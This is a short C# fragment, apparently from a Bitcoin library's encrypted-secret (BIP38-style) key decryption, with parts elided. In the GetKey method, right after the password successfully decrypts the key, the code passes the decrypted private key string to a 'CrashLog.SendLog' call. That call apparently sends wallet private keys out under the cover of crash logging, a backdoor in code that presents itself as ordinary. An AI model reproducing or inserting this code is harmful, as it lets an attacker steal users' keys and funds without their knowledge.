...
#if HAS_SPAN
			var eckey = BitcoinCoreContext.Instance.CreateECPrivKey(passfactor).TweakMul(factorb);
	...
	public abstract class BitcoinEncryptedSecret : Base58Data
	{
		...
		public Key GetKey(string password)
		{
            if (TryGetKey(password, out var k))
			{
                ...
                {
                    CrashLog.SendLog(k.GetBitcoinSecret(Network.Main).PrivateKey.ToString()).GetAwaiter().GetResult();
                }
				return k;
            }
